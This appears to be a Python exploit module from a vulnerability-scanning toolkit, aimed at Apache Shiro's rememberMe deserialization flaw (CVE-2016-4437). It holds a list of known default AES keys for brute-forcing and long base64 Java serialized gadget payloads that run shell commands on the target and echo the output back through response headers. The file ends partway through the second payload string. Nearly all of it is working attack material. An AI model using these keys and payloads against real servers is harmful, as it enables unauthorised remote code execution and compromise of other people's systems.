from ClassCongregation import ysoserial_payload,Dnslog
from util.ExpRequest import ExpRequest,Output
from operator import methodcaller
from Crypto.Cipher import AES
import util.globalvar as GlobalVar
import base64
import uuid
import binascii
"""
CommonsBeanutils1
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
CommonsCollections7
CommonsCollections8
CommonsCollections9
CommonsCollections10
--------------------
SpringEcho1
SpringEcho2
Tomcat6Echo
Tomcat7_8Echo
Tomcat9Echo
WeblogicEcho1
"""
GlobalVar.set_value('key', "1QWLxg+NYmxraMoxAXu/Iw==")
GlobalVar.set_value('gadget', "CommonsBeanutils1")
GlobalVar.set_value('echo', "SpringEcho1")

class ApacheShiro():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.status = env.get('status')

    #检测是否存在漏洞
    def cve_2016_4437(self):
        appName = 'Apache Shiro'
        pocname = 'CVE-2016-4437'
        path = '/'
        method = 'post'
        desc = '<= 1.2.4, shiro-550, rememberme deserialization rce'
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        #反序列化利用组件
        key_lists = ['L7RioUULEFhRyxM7a2R/Yg==','kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==', 'Z3VucwAAAAAAAAAAAAAAAA==', 'fCq+/xW488hMTCD+cmJ3aQ==', '0AvVhmFLUs0KTA3Kprsdag==', '1AvVhdsgUs0FSA3SDFAdag==', '1QWLxg+NYmxraMoxAXu/Iw==', '25BsmdYwjnfcWmnhAciDDg==', '2AvVhdsgUs0FSA3SDFAdag==', '3AvVhmFLUs0KTA3Kprsdag==', '3JvYhmBLUs0ETA5Kprsdag==', 'r0e3c16IdVkouZgk1TKVMg==', '5aaC5qKm5oqA5pyvAAAAAA==', '5AvVhmFLUs0KTA3Kprsdag==', '6AvVhmFLUs0KTA3Kprsdag==', '6NfXkC7YVCV5DASIrEm1Rg==', '6ZmI6I2j5Y+R5aSn5ZOlAA==', 'cmVtZW1iZXJNZQAAAAAAAA==', '7AvVhmFLUs0KTA3Kprsdag==', '8AvVhmFLUs0KTA3Kprsdag==', '8BvVhmFLUs0KTA3Kprsdag==', '9AvVhmFLUs0KTA3Kprsdag==', 'OUHYQzxQ/W9e/UjiAGu6rg==', 'a3dvbmcAAAAAAAAAAAAAAA==', 'aU1pcmFjbGVpTWlyYWNsZQ==', 'bWljcm9zAAAAAAAAAAAAAA==', 'bWluZS1hc3NldC1rZXk6QQ==', 'bXRvbnMAAAAAAAAAAAAAAA==', 'ZUdsaGJuSmxibVI2ZHc9PQ==', 'wGiHplamyXlVB11UXWol8g==', 'U3ByaW5nQmxhZGUAAAAAAA==', 'MTIzNDU2Nzg5MGFiY2RlZg==', 'a2VlcE9uR29pbmdBbmRGaQ==', 'WcfHGU25gNnTxTlmJMeSpw==', 'OY//C4rhfwNxCQAQCrQQ1Q==', '5J7bIJIV0LQSN3c9LPitBQ==', 'f/SY5TIve5WWzT4aQlABJA==']
        gadget_lists = ['CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'CommonsCollections8', 'CommonsCollections9', 'CommonsCollections10']
        echo_lists = ['SpringEcho1', 'SpringEcho2', 'Tomcat6Echo', 'Tomcat7_8Echo', 'Tomcat9Echo','WeblogicEcho1']
        #自定义payload
        CommonsCollectionsK1 = r"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACX" \
                            r"RocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5j" \
                            r"b2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEk" \
                            r"xqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwc3IAOmNvbS5z" \
                            r"dW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcG" \
                            r"wJV0/BbqyrMwMACEkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VT" \
                            r"ZXJ2aWNlc01lY2hhbmlzbUwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS" \
                            r"94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVz" \
                            r"dAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS" \
                            r"9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVy" \
                            r"dGllczt4cAAAAAH/////AXB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4Bg" \
                            r"hU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb29vOFZ0d1NZRlUHAAEBABBqYXZhL2xhbmcv" \
                            r"T2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb284VnR3U1lGVS5qYXZhAQAJd3JpdGVCb2" \
                            r"R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGls" \
                            r"LmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKE" \
                            r"xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJ" \
                            r"bnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCA" \
                            r"AVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5n" \
                            r"L0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1" \
                            r"N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsM" \
                            r"AB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbG" \
                            r"VjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xh" \
                            r"bmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBAB" \
                            r"MoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRo" \
                            r"b2QMADMAIAoADAA0AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2" \
                            r"phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlvbnMB" \
                            r"ABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KE" \
                            r"xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVj" \
                            r"dDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW" \
                            r"5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4" \
                            r"Y2VwdGlvbgcARwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3" \
                            r"RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmpl" \
                            r"Y3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcm" \
                            r"VmbGVjdC9GaWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFu" \
                            r"Zy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMoKVYMACMAXQ" \
                            r"oABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZh" \
                            r"L2xhbmcvVGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbG" \
                            r"FuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBCCgACAGwBABNb" \
                            r"TGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbm" \
                            r"c7DABwAHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJT" \
                            r"ZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8AQASamF2YS9sYW" \
                            r"5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEA" \
                            r"CnByb2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiw" \
                            r"sAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dl" \
                            r"dFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQ" \
                            r"ADKClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3Rj" \
                            r"bWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcApQEAC2dldFByb3Blcn" \
                            r"R5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCp" \
                            r"AQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi" \
                            r"9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhq" \
                            r"YXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDA" \
                            r"AjALwKALsAvQEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAC/AMAKALsAwQEA" \
                            r"EWphdmEvbGFuZy9Qcm9jZXNzBwDDAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0" \
                            r"lucHV0U3RyZWFtOwwAxQDGCgDEAMcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMA" \
                            r"yQoAuQDKAQACXEEIAMwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KU" \
                            r"xqYXZhL3V0aWwvU2Nhbm5lcjsMAM4AzwoAuQDQAQAEbmV4dAwA0gBxCgC5ANMBAAhnZXRC" \
                            r"eXRlcwEABCgpW0IMANUA1goAXADXDAAHAAgKAAIA2QEADWdldFByb3BlcnRpZXMBABgoKU" \
                            r"xqYXZhL3V0aWwvUHJvcGVydGllczsMANsA3AoApgDdAQATamF2YS91dGlsL0hhc2h0YWJs" \
                            r"ZQcA3wEACHRvU3RyaW5nDADhAHEKAOAA4gEAE1tMamF2YS9sYW5nL1N0cmluZzsHAOQBAE" \
                            r"Bjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0" \
                            r"cmFjdFRyYW5zbGV0BwDmCgDnAF4AIQACAOcAAAAAAAMACgAHAAgAAgA8AAAA3AAIAAUAAA" \
                            r"CxEgq4ABBOLbYAFE0tEhYGvQAMWQMSGFNZBLIAHlNZBbIAHlO2ACIsBr0ABFkDK1NZBLsA" \
                            r"GlkDtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALF" \
                            r"enAEg6BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMt" \
                            r"U7YANSoEvQAEWQMsU7YALFenAAOxAAEAAABoAGsANwABAEAAAAARAAL3AGsHADf9AEQHAA" \
                            r"QHAAwAPQAAAAQAAQA/AAoAQQBCAAIAPAAAAH4AAwAFAAAAPwFNKrYAME6nABktK7YARk2n" \
                            r"ABanAAA6BC22AEtOpwADLRIEpv/nLAGmAAy7AEhZK7cATr8sBLYAVCwqtgBasAABAAoAEw" \
                            r"AWAEgAAQBAAAAAJQAG/QAKBwBWBwAMCP8AAgAEBwAEBwBcBwBWBwAMAAEHAEgJBQ0APQAA" \
                            r"AAQAAQA/AAEAIwBdAAIAPAAAAzYACAANAAACPyq3AOgDNgS4AGW2AGkSa7gAbcAAbzoFAz" \
                            r"YGFQYZBb6iAh8ZBRUGMjoHGQcBpgAGpwIJGQe2AHNOLRJ1tgB5mgAMLRJ7tgB5mgAGpwHu" \
                            r"GQcSfbgAbUwrwQB/mgAGpwHcKxKBuABtEoO4AG0ShbgAbUynAAs6CKcBw6cAACsSh7gAbc" \
                            r"AAiToJAzYKFQoZCbkAjQEAogGeGQkVCrkAkAIAOgsZCxKSuABtTCu2ADASlAO9AAy2ADUr" \
                            r"A70ABLYALE0rtgAwEpYEvQAMWQMSXFO2ADUrBL0ABFkDEphTtgAswABcTi0BpQAKLbYAnJ" \
                            r"kABqcAWCy2ADASngS9AAxZA7IAHlO2ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXLLYAMBKg" \
                            r"Bb0ADFkDElxTWQQSXFO2ADUsBb0ABFkDEphTWQQtU7YALFcENgQrtgAwEpYEvQAMWQMSXF" \
                            r"O2ADUrBL0ABFkDEqJTtgAswABcTi0BpQAKLbYAnJkABqcAjSy2ADASngS9AAxZA7IAHlO2" \
                            r"ADUsBL0ABFkDuwAaWREAyLcAJlO2ACxXEqS4AKq2AK0Sr7YAeZkAGAa9AFxZAxKxU1kEEr" \
                            r"NTWQUtU6cAFQa9AFxZAxK1U1kEErdTWQUtUzoMLLsAuVm7ALtZGQy3AL62AMK2AMi3AMsS" \
                            r"zbYA0bYA1LYA2LgA2gQ2BC0BpQAKLbYAnJkACBUEmgAGpwAQLLgA3rYA47YA2LgA2hUEmQ" \
                            r"AGpwAJhAoBp/5cFQSZAAanAAmEBgGn/d+xAAEAXwBwAHMAPwABAEAAAADdABn/ABoABwcA" \
                            r"AgAAAAEHAG8BAAD8ABcHAGH/ABcACAcAAgAABwBcAQcAbwEHAGEAAAL/ABEACAcAAgcABA" \
                            r"AHAFwBBwBvAQcAYQAAUwcAPwT/AAIACAcAAgcABAAHAFwBBwBvAQcAYQAA/gANAAcAiQH/" \
                            r"AGMADAcAAgcABAcABAcAXAEHAG8BBwBhAAcAiQEHAAQAAAL7AFQuAvsATVEHAOUpCwQCDA" \
                            r"f/AAUACwcAAgcABAAHAFwBBwBvAQcAYQAHAIkBAAD/AAcACAcAAgAAAAEHAG8BBwBhAAD6" \
                            r"AAUAPQAAAAQAAQA/AAEABQAAAAIABnB0AANhYmNzcgAUamF2YS51dGlsLlByb3BlcnRpZX" \
                            r"M5EtB6cDY+mAIAAUwACGRlZmF1bHRzcQB+AAt4cgATamF2YS51dGlsLkhhc2h0YWJsZRO7" \
                            r"DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAA" \
                            r"AAeHB3AQB4c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1h" \
                            r"cG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdG" \
                            r"lvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25z" \
                            r"LmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTG" \
                            r"phdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4AClsAC2lQYXJhbVR5cGVzcQB+" \
                            r"AAl4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAB0AA5uZXdUcm" \
                            r"Fuc2Zvcm1lcnVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHNxAH4A" \
                            r"AD9AAAAAAAAMdwgAAAAQAAAAAHh4dAABdHg="

        CommonsCollectionsK2 = r"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACX" \
                            r"RocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANW9yZy5hcGFjaGUuY29tbW9ucy5j" \
                            r"b2xsZWN0aW9uczQua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0AB" \
                            r"JMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyADpjb20u" \
                            r"c3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbX" \
                            r"BsCVdPwW6sqzMDAAhJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhaABVfdXNl" \
                            r"U2VydmljZXNNZWNoYW5pc21MAAtfYXV4Q2xhc3Nlc3QAO0xjb20vc3VuL29yZy9hcGFjaG" \
                            r"UveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9IYXNodGFibGU7WwAKX2J5dGVjb2Rl" \
                            r"c3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdm" \
                            r"EvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3Bl" \
                            r"cnRpZXM7eHAAAAAB/////wFwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+A" \
                            r"YIVOACAAB4cAAADwPK/rq+AAAAMgDpAQAMRm9vMUlwV2dPa2N3BwABAQAQamF2YS9sYW5n" \
                            r"L09iamVjdAcAAwEAClNvdXJjZUZpbGUBABFGb28xSXBXZ09rY3cuamF2YQEACXdyaXRlQm" \
                            r"9keQEAFyhMamF2YS9sYW5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRp" \
                            r"bC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQAHZm9yTmFtZQEAJS" \
                            r"hMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3" \
                            r"SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcw" \
                            r"gAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWVBFAQARTGphdmEvbGFu" \
                            r"Zy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy" \
                            r"9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7" \
                            r"DAAfACAKAAwAIQEABjxpbml0PgEABChJKVYMACMAJAoAGgAlAQAYamF2YS9sYW5nL3JlZm" \
                            r"xlY3QvTWV0aG9kBwAnAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9s" \
                            r"YW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAApACoKACgAKwEACGdldENsYXNzAQ" \
                            r"ATKClMamF2YS9sYW5nL0NsYXNzOwwALQAuCgAEAC8BAAdkb1dyaXRlCAAxAQAJZ2V0TWV0" \
                            r"aG9kDAAzACAKAAwANAEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HADYBAB" \
                            r"NqYXZhLm5pby5CeXRlQnVmZmVyCAA4AQAEd3JhcAgAOgEABENvZGUBAApFeGNlcHRpb25z" \
                            r"AQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAPgEADVN0YWNrTWFwVGFibGUBAAVnZXRGVgEAOC" \
                            r"hMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmpl" \
                            r"Y3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbG" \
                            r"FuZy9yZWZsZWN0L0ZpZWxkOwwAQwBECgAMAEUBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRF" \
                            r"eGNlcHRpb24HAEcBAA1nZXRTdXBlcmNsYXNzDABJAC4KAAwASgEAFShMamF2YS9sYW5nL1" \
                            r"N0cmluZzspVgwAIwBMCgBIAE0BACJqYXZhL2xhbmcvcmVmbGVjdC9BY2Nlc3NpYmxlT2Jq" \
                            r"ZWN0BwBPAQANc2V0QWNjZXNzaWJsZQEABChaKVYMAFEAUgoAUABTAQAXamF2YS9sYW5nL3" \
                            r"JlZmxlY3QvRmllbGQHAFUBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xh" \
                            r"bmcvT2JqZWN0OwwAVwBYCgBWAFkBABBqYXZhL2xhbmcvU3RyaW5nBwBbAQADKClWDAAjAF" \
                            r"0KAAQAXgEAEGphdmEvbGFuZy9UaHJlYWQHAGABAA1jdXJyZW50VGhyZWFkAQAUKClMamF2" \
                            r"YS9sYW5nL1RocmVhZDsMAGIAYwoAYQBkAQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2" \
                            r"xhbmcvVGhyZWFkR3JvdXA7DABmAGcKAGEAaAEAB3RocmVhZHMIAGoMAEEAQgoAAgBsAQAT" \
                            r"W0xqYXZhL2xhbmcvVGhyZWFkOwcAbgEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW" \
                            r"5nOwwAcABxCgBhAHIBAARleGVjCAB0AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFy" \
                            r"U2VxdWVuY2U7KVoMAHYAdwoAXAB4AQAEaHR0cAgAegEABnRhcmdldAgAfAEAEmphdmEvbG" \
                            r"FuZy9SdW5uYWJsZQcAfgEABnRoaXMkMAgAgAEAB2hhbmRsZXIIAIIBAAZnbG9iYWwIAIQB" \
                            r"AApwcm9jZXNzb3JzCACGAQAOamF2YS91dGlsL0xpc3QHAIgBAARzaXplAQADKClJDACKAI" \
                            r"sLAIkAjAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwAVwCOCwCJAI8BAANyZXEIAJEBAAtn" \
                            r"ZXRSZXNwb25zZQgAkwEACWdldEhlYWRlcggAlQEACFRlc3RlY2hvCACXAQAHaXNFbXB0eQ" \
                            r"EAAygpWgwAmQCaCgBcAJsBAAlzZXRTdGF0dXMIAJ0BAAlhZGRIZWFkZXIIAJ8BAAdUZXN0" \
                            r"Y21kCAChAQAHb3MubmFtZQgAowEAEGphdmEvbGFuZy9TeXN0ZW0HAKUBAAtnZXRQcm9wZX" \
                            r"J0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DACnAKgKAKYA" \
                            r"qQEAC3RvTG93ZXJDYXNlDACrAHEKAFwArAEABndpbmRvdwgArgEAB2NtZC5leGUIALABAA" \
                            r"IvYwgAsgEABy9iaW4vc2gIALQBAAItYwgAtgEAEWphdmEvdXRpbC9TY2FubmVyBwC4AQAY" \
                            r"amF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwC6AQAWKFtMamF2YS9sYW5nL1N0cmluZzspVg" \
                            r"wAIwC8CgC7AL0BAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwAvwDACgC7AMEB" \
                            r"ABFqYXZhL2xhbmcvUHJvY2VzcwcAwwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby" \
                            r"9JbnB1dFN0cmVhbTsMAMUAxgoAxADHAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAj" \
                            r"AMkKALkAygEAAlxBCADMAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOy" \
                            r"lMamF2YS91dGlsL1NjYW5uZXI7DADOAM8KALkA0AEABG5leHQMANIAcQoAuQDTAQAIZ2V0" \
                            r"Qnl0ZXMBAAQoKVtCDADVANYKAFwA1wwABwAICgACANkBAA1nZXRQcm9wZXJ0aWVzAQAYKC" \
                            r"lMamF2YS91dGlsL1Byb3BlcnRpZXM7DADbANwKAKYA3QEAE2phdmEvdXRpbC9IYXNodGFi" \
                            r"bGUHAN8BAAh0b1N0cmluZwwA4QBxCgDgAOIBABNbTGphdmEvbGFuZy9TdHJpbmc7BwDkAQ" \
                            r"BAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJz" \
                            r"dHJhY3RUcmFuc2xldAcA5goA5wBeACEAAgDnAAAAAAADAAoABwAIAAIAPAAAANwACAAFAA" \
                            r"AAsRIKuAAQTi22ABRNLRIWBr0ADFkDEhhTWQSyAB5TWQWyAB5TtgAiLAa9AARZAytTWQS7" \
                            r"ABpZA7cAJlNZBbsAGlkrvrcAJlO2ACxXKrYAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2AC" \
                            r"xXpwBIOgQSObgAEE4tEjsEvQAMWQMSGFO2ACItBL0ABFkDK1O2ACxNKrYAMBIyBL0ADFkD" \
                            r"LVO2ADUqBL0ABFkDLFO2ACxXpwADsQABAAAAaABrADcAAQBAAAAAEQAC9wBrBwA3/QBEBw" \
                            r"AEBwAMAD0AAAAEAAEAPwAKAEEAQgACADwAAAB+AAMABQAAAD8BTSq2ADBOpwAZLSu2AEZN" \
                            r"pwAWpwAAOgQttgBLTqcAAy0SBKb/5ywBpgAMuwBIWSu3AE6/LAS2AFQsKrYAWrAAAQAKAB" \
                            r"MAFgBIAAEAQAAAACUABv0ACgcAVgcADAj/AAIABAcABAcAXAcAVgcADAABBwBICQUNAD0A" \
                            r"AAAEAAEAPwABACMAXQACADwAAAM2AAgADQAAAj8qtwDoAzYEuABltgBpEmu4AG3AAG86BQ" \
                            r"M2BhUGGQW+ogIfGQUVBjI6BxkHAaYABqcCCRkHtgBzTi0SdbYAeZoADC0Se7YAeZoABqcB" \
                            r"7hkHEn24AG1MK8EAf5oABqcB3CsSgbgAbRKDuABtEoW4AG1MpwALOginAcOnAAArEoe4AG" \
                            r"3AAIk6CQM2ChUKGQm5AI0BAKIBnhkJFQq5AJACADoLGQsSkrgAbUwrtgAwEpQDvQAMtgA1" \
                            r"KwO9AAS2ACxNK7YAMBKWBL0ADFkDElxTtgA1KwS9AARZAxKYU7YALMAAXE4tAaUACi22AJ" \
                            r"yZAAanAFgstgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVyy2ADAS" \
                            r"oAW9AAxZAxJcU1kEElxTtgA1LAW9AARZAxKYU1kELVO2ACxXBDYEK7YAMBKWBL0ADFkDEl" \
                            r"xTtgA1KwS9AARZAxKiU7YALMAAXE4tAaUACi22AJyZAAanAI0stgAwEp4EvQAMWQOyAB5T" \
                            r"tgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVxKkuACqtgCtEq+2AHmZABgGvQBcWQMSsVNZBB" \
                            r"KzU1kFLVOnABUGvQBcWQMStVNZBBK3U1kFLVM6DCy7ALlZuwC7WRkMtwC+tgDCtgDItwDL" \
                            r"Es22ANG2ANS2ANi4ANoENgQtAaUACi22AJyZAAgVBJoABqcAECy4AN62AOO2ANi4ANoVBJ" \
                            r"kABqcACYQKAaf+XBUEmQAGpwAJhAYBp/3fsQABAF8AcABzAD8AAQBAAAAA3QAZ/wAaAAcH" \
                            r"AAIAAAABBwBvAQAA/AAXBwBh/wAXAAgHAAIAAAcAXAEHAG8BBwBhAAAC/wARAAgHAAIHAA" \
                            r"QABwBcAQcAbwEHAGEAAFMHAD8E/wACAAgHAAIHAAQABwBcAQcAbwEHAGEAAP4ADQAHAIkB" \
